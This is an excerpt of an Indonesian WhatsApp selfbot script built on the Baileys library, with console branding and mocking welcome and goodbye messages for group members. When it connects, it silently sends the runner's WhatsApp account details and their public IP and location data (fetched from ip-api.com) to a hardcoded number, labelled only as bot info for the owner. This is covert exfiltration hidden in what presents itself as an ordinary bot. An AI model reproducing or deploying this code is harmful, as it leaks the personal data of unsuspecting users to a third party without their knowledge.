...
prefix = '#'
shp = '⬡'
owner = "6285854721440@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.on("qr", () => {
    console.log(
      ...
      color("]", "white"),
      color(" Scan bang"),
      client.sendMessage(`6285854721440@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Berhasil Terhubung!_`, MessageType.extendedText)
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗚𝘄 𝗦𝘂𝘀𝘂𝗻 𝗦𝗲𝗻𝗱𝗶𝗿𝗶!\n𝗡𝗼𝘁𝗲: 𝗝𝗮𝗻𝗴𝗮𝗻 𝗟𝘂𝗽𝗮 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲 𝙉𝙖𝙣𝙙𝙖 𝙎𝙩𝙮𝙡𝙚 シ︎', 'yellow'))
    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/6283162388082'))
    console.log(color('[PUTTBOTZ]'), color('𝗦𝗲𝗹𝗳𝗯𝗼𝘁 𝙉𝙖𝙣𝙙𝙖 𝙎𝙩𝙮𝙡𝙚 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`6285854721440@s.whatsapp.net`, `*Hai Owner NdaaBotzl, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer NdaaBotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6283162388082?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("6285854721440@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer NdaaBotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6283162388082?text=Assalamualaikum"}}})
...
fkontakk = { key: {
 ...
 message: {
    "contactMessage":{"displayName":'𝘕𝘢𝘯𝘥𝘢 𝘚𝘵𝘺𝘭𝘦シ︎⁩',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Nanda Style;;;\nFN:resku\nitem1.TEL;waid=6283162388082:+62 831-6238-8082\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
...
if (anu.action == 'add' && !mem.includes(client.user.jid)) {
			 ...
			 const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
                ...
                teks = `🌹 *Hɪ* @${num.split('@')[0]}\n🌹 *Bɪᴏ* : *${thu.status}*\n🌹 *Mᴇᴍʙᴇʀs : ${memeg}*\n🌹 *Wᴇʟᴄᴏᴍᴇ Tᴏ* \n *${mdata.subject}*\n🌹 *Welcome Member Beban Jangan Semangat Tetep Putus Asa!!*\n ${time_wel} -  ${time_welc}`
            ...
            if (anu.action == 'remove' && !mem.includes(client.user.jid)) {
                ...
                out = `*Gᴏᴏᴅ Bye Beban Grup* 👋\n@${num.split('@')[0]}\n *Semoga Lu Jadi Beban DiGrup Lain!!* 🌹\n${time_wel} -  ${time_welc}`
                goodbyeBut = [{buttonId:`${prefix}h`,buttonText:{displayText:'Bye Beban Grup 🚪'},type:1}, {buttonId:`${prefix}sc`,buttonText:{displayText:'SC'}, type:1}]
